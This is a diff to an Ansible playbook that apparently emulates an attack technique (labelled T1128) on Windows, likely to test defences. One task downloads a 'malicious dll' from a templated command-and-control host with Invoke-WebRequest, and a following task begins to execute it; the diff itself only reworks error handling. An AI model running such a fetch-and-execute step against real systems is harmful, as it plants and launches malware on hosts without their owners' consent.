@@ -7,7 +7,10 @@
     - name: download malicious dll
       win_shell: Invoke-WebRequest -Uri http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ cnc_dll }} -OutFile C:\temp\{{ cnc_dll }}
       register: command_result
-      failed_when: "'Unable to connect' in command_result.stderr"   
+      ignore_errors: yes
+    - name: check download status
+      fail: msg="Playbook Completed:T1128:failed:win:"
+      when: "'Unable to connect' in command_result.stderr" 
     - name: execute malicious dll
       win_shell: |
         cd c:\temp
